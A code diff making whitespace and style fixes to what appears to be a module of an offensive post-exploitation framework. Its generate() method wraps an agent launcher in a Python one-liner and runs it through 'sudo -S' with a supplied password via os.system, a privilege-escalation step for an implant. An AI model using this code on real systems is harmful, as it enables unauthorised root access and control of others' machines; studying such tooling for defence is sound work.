@@ -1,5 +1,6 @@
 from lib.common import helpers
 
+
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -26,7 +27,7 @@ class Module:
 
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : True,
-            
+
             # list of any references/other comments
             'Comments': []
         }
@@ -82,7 +83,6 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-
     def generate(self):
 
         # extract all of our options
@@ -103,13 +103,13 @@ class Module:
             print helpers.color("[!] Error in launcher command generation.")
             return ""
         else:
-            
+
             password = self.options['Password']['Value']
 
-            launcher = launcher.replace('"','\\"')
-            launcher = launcher.replace('echo','')
+            launcher = launcher.replace('"', '\\"')
+            launcher = launcher.replace('echo', '')
             parts = launcher.split("|")
-            launcher = "python -c %s" %(parts[0])
-            script = 'os.system("echo \\"%s\\" | sudo -S %s")' %(password, launcher)
+            launcher = "python -c %s" % (parts[0])
+            script = 'os.system("echo \\"%s\\" | sudo -S %s")' % (password, launcher)
 
             return script
